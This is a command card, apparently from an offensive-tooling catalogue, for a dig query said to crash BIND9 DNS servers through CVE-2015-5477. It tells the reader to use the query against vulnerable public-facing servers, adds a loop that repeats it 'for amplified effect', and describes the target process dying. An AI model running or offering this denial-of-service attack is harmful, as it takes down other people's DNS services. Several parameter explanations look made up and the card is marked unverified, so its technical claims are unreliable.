---
id: cmd-uuid-1234-5678
name: dig-bind9-tkey-dos
type: command
executor: bash
data: dig @$TARGET_IP +edns=0 +bufsize=512 +dnssec -t TKEY malformed.tkey.example
output: null
created_at: '2024-10-01T00:00:00Z'
updated_at: '2025-12-14T17:26:36.931Z'
platforms:
  - Linux
tags:
  - dos
  - dns
  - recon
verified: false
validated: true
submitted: true
---

# dig-bind9-tkey-dos

## Command

```bash
dig @$TARGET_IP +edns=0 +bufsize=512 +dnssec -t TKEY malformed.tkey.example
```

## Description

This dig command sends a crafted TKEY query to a BIND9 DNS server to exploit CVE-2015-5477, triggering a crash via assertion failure. Use it in DoS scenarios against vulnerable public-facing DNS servers. Replace `$TARGET_IP` with the target's IP address.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `@$TARGET_IP` | IP address of the DNS server | Yes |
| `+edns=0` | Enable EDNS version 0 for malformed packet | Yes |
| `+bufsize=512` | Set UDP buffer size to 512 bytes to trigger buffer handling bug | Yes |
| `+dnssec` | Enable DNSSEC flags to force TKEY processing path | Yes |
| `-t TKEY` | Specify TKEY query type | Yes |
| `malformed.tkey.example` | Bogus query name to cause assertion failure | Yes |

## Examples

### Basic Usage

```bash
dig @192.0.2.1 +edns=0 +bufsize=512 +dnssec -t TKEY malformed.tkey.example
```

### Advanced Usage

To send multiple queries for amplified effect:

```bash
for i in {1..10}; do dig @192.0.2.1 +edns=0 +bufsize=512 +dnssec -t TKEY malformed.tkey.example; done
```

## Expected Output

The command may return a brief DNS response, error, or timeout from the client side. On success, the target server crashes without responding to further queries. Server-side: Logs show "assertion failed" in tkey.c, and the named process exits.

## Related

- [[Related Procedure|procedures/Exploit-BIND9-TKEY-Vulnerability-for-DoS]]
